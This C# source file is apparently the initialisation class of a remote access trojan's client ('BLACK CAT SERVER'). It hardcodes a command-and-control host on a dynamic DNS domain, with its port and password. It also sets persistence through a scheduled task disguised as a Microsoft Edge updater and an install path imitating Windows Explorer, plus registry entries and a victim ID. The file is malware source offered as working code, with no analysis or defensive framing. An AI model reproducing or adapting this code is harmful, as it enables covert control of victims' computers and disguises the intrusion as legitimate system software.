using bc.srv.Class.Crypt;

namespace bc.srv.Class
{
    internal class CreateStClient
    {
        public bool InitializeStClient()
        {
            
//             #if DEBUG
//             //TEST
//             ST_Client.Instance.Port = 2401;
//             ST_Client.Instance.Password = "cammello";
//             ST_Client.Instance.Host = "127.0.0.1";
//
//             ST_Client.Instance.bUseHKCU = false;
//             ST_Client.Instance.bUseExplorer = false;
//             ST_Client.Instance.bUseStartupFolder = false;
//
//             ST_Client.Instance.sAppDataInstall = @"BLACK CAT SERVER\TEST\SERVER.EXE";
//             ST_Client.Instance.sStartupFileName = @"SERVER.EXE";
//
//             ST_Client.Instance.sExplorerEntry = "EXPLO";
//             ST_Client.Instance.sHKCUEntry = "HKCU";
//
//             ST_Client.Instance.sMutex = "MUTEX_TEST";
//
//
//             //TEST
// #else

            // NORMAL

            ST_Client.Instance.Port = 2401;
            ST_Client.Instance.Password = "slevin";
            ST_Client.Instance.Host = "lqphnd2gfz.duckdns.org";
            ST_Client.Instance.ServerName = "imback";
            ST_Client.Instance.sMutex = "tUOns2DB6";

            // RECUPERO INFO INSTALLAZIONE
            // bool usehk, useex, usestart;
            // string apppath, startupfilename;
            // string hkcuEntry, exploEntry;
            //
            // ru.GetInstallInfo(out usehk, out useex, out apppath, out usestart, out startupfilename, out hkcuEntry, out exploEntry);


            ST_Client.Instance.UseTaskScheduler = true;
            ST_Client.Instance.bUseHKCU = false;
            ST_Client.Instance.bUseExplorer = false;
            ST_Client.Instance.bUseStartupFolder = false;


            ST_Client.Instance.sAppDataInstall = "Microsoft\\Windows\\Edge\\explorer.exe";
            ST_Client.Instance.sStartupFileName = "explore.exe";
            ST_Client.Instance.TaskSchedulerName = "MicrosoftEdgeUpdaterTaskMachineCore";
            
            ST_Client.Instance.sHKCUEntry = "winexplorer";
            ST_Client.Instance.sExplorerEntry = "EXPLORER";

            // ERRORE RECUPERO DATI DA RISORSE
            if (ST_Client.Instance.Port == -1 || ST_Client.Instance.Password == null || ST_Client.Instance.Host == null)
                Program.Exit(2);
            //-----------------------------------

            // END NORMAL
            // #endif


            // GESTIONE SERVER NAME
            var rm = new RegistryManager();
            var td = new Text_Des();

            string servName;

            var regExist = rm.ExistServerNameEntry();

            if (regExist)
            {
                servName = td.Decrypt(rm.GetNameFromRegistry(), true);
            }
            else
            {
                servName = ST_Client.Instance.ServerName;

                if (servName == null)
                    servName = "NO NAME";

                rm.SetNewNameInRegistry(td.Encrypt(servName,
                    true)); // prima esecuzione setto il nome sul registro                
            }

            ST_Client.Instance.ServerName = servName;
            //-------------------------------------------------

            var uid = new UnivoqueID();
            ST_Client.Instance.UnivoqueID = uid.GetUnivoqueID(); // ASSEGNO IL CODICE UNIVOCO    

            return true;
        }
    }
}